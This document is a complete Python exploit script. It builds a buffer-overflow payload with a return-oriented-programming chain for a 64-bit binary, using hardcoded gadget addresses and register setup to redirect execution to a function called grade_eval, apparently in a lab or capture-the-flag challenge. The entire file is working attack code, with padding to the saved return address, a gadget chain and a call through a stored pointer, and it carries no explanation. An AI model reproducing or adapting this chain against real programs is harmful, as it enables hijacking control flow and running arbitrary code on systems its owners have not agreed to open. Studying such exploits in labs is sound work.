import sys
import struct

def p64(x):
    return struct.pack("<Q", x)

grade_eval = 0x401978
command_buf = 0x602090

ret = 0x401a34
pop_gadget = 0x401a2a
call_gadget = 0x401a10
exit_plt = 0x4016e0

# Store grade_eval's address in command_buf
payload = p64(grade_eval)

# Fill up to the saved return address
payload += b"A" * (24 - len(payload))

# ROP chain
payload += p64(ret)
payload += p64(pop_gadget)

payload += p64(0)            # rbx
payload += p64(1)            # rbp
payload += p64(command_buf)  # r12
payload += p64(4)            # r13
payload += p64(0)            # r14
payload += p64(0)            # r15

payload += p64(call_gadget)

# Stack values consumed after grade_eval returns
payload += p64(0)
payload += p64(0) * 6
payload += p64(exit_plt)

sys.stdout.buffer.write(payload + b"\n")
